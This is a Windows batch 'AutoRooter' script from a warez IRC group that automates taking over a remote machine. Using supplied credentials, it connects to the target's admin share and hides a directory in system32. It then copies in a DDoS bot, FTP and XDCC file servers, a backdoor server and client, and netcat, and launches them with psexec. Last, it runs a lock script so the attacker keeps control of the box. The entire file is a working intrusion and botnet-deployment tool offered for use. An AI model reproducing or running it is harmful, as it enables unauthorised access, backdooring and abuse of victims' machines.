@echo off

::---------------------------------------------
:: AutoRooter Editted By RCaN
:: For #Warez-Galore on Renegadeirc
::---------------------------------------------
echo.
echo	       ##  WeLcOmE tO  ##     
echo	       #                #
echo	       #  tHa     ####  #     
echo	       #         ##  #  #     
echo	     ### ##   ## ##     ###   
echo	  ###### ##   ## ## ### ######
echo	       # ## # ## ##  ## #     
echo	       #  ## ##   ####  #     
echo	       #                #
echo	       ##   rOOt KiT   ##     
echo.
echo.
echo Authors......: Tony With help From WakkO
echo Version......: 2.3
echo Notes........: Private!!!
echo Gr33t!ngs....: Rio, this is your own private rootkit 
echo.
echo lets ping this bitch first yeah?
ping %1
echo how did it go enter to go on, or the usual ctrl+c
pause
echo Change your BotNick in wg.dll then press enter.
pause
cls
echo Using IP: %1 User: %2 and Pass: %3
echo RootKit path: %4
echo If these are right hit enter else Ctrl-C
pause
echo.
echo.
echo Now connecting to %1 
net use \\%1 /user:%2 %3
echo If Successful Continue if not Ctrl-C
pause
echo.
echo Mapping %1 to x: 
net use x: \\%1\c$
echo If Successful Continue if not Ctrl-C
pause
echo.
echo.
@echo off
echo Making sure dll-temp directory exists..
mkdir x:\WINNT\system32\mui\dispspec\temp\
echo Setting dll-temp as a hidden DIR if not already..
attrib +h x:\WINNT\system32\mui\dispspec\temp\
echo Creating directories for packs and files..
mkdir x:\WINNT\system32\mui\dispspec\temp\uploads\
echo Copying required files to %1 ..
echo This may take 2+ minutes. If it goes beyond 5
echo minutes than the box is probably really slow 
echo and not worth it, or there is something wrong.
echo.
echo (*    2%     ) DDoS Bot (Evil Bot)
copy %4\winip.exe x:\WINNT\system32\mui\dispspec\temp\
echo (*    9%     ) FireDaemon
copy %4\firedaemon.exe x:\WINNT\system32\mui\dispspec\temp\
echo (**   18%    ) Serv-U
copy %4\winmgnt.exe x:\WINNT\system32\mui\dispspec\temp\
echo (***  27%    ) Iroffer
copy %4\dll32.exe x:\WINNT\system32\mui\dispspec\temp\
echo (**** 36%    ) Required Libraries
copy %4\tzolibr.dll x:\WINNT\system32\mui\dispspec\temp\
echo (*****45%    ) Required Libraries 2
copy %4\cygwin1.dll x:\WINNT\system32\mui\dispspec\temp\
echo (*****54%    ) Iroffer Config
copy %4\wg.dll x:\WINNT\system32\mui\dispspec\temp\
echo (*****63%    ) Serv-U Config
copy %4\Serv-U.ini x:\WINNT\system32\mui\dispspec\temp\
copy %4\lock.bat x:\WINNT\system32\mui\dispspec\temp\
echo (*****72%    ) Rar Archiver
copy %4\rar.exe x:\WINNT\system32\mui\dispspec\temp\uploads\
echo (*****81% *  ) Environment Batch
copy %4\env.bat x:\WINNT\system32\mui\dispspec\temp\
echo (*****85% ** ) Process Killah
copy %4\kill.exe x:\WINNT\system32\mui\dispspec\temp\
echo (*****90% ** ) Backdoor Server
copy %4\winxhelp.exe x:\WINNT\system32\mui\dispspec\temp\
echo (*****93% ** ) Backdoor Client
copy %4\aclient.exe x:\WINNT\system32\mui\dispspec\temp\
echo (*****95% ** ) Welcome File
copy %4\welcome.dll x:\WINNT\system32\mui\dispspec\temp\
echo (*****97% ***) Secure File 
copy %4\secure.exe x:\WINNT\system32\mui\dispspec\temp\
echo (*****99% ***) NetCat File
copy %4\nc.exe x:\WINNT\system32\mui\dispspec\temp\
echo (**Complete**) SuccessFully Uploaded 17 Filez
echo Finished copying Files.
echo Hit any Key to start Service Installation.
echo Else hit Ctrl-C.
pause 
echo Running Packet Bot
%4\psexec \\%1 -d "c:\winnt\system32\mui\dispspec\temp\winip.exe"
echo Setting FireDaemon Environment Variable..
%4\psexec \\%1 "c:\winnt\system32\mui\dispspec\temp\env.bat"
echo Setting Security on This Box. this is the last point of no return to this box, make sure it has joined the channel then proceed, elso hit ctrl+c
pause
%4\psexec \\%1 "c:\winnt\system32\mui\dispspec\temp\lock.bat"
echo Disconnecting from remote boxes..
net use * /del
echo Process Finished. Hit any Key to exit.
pause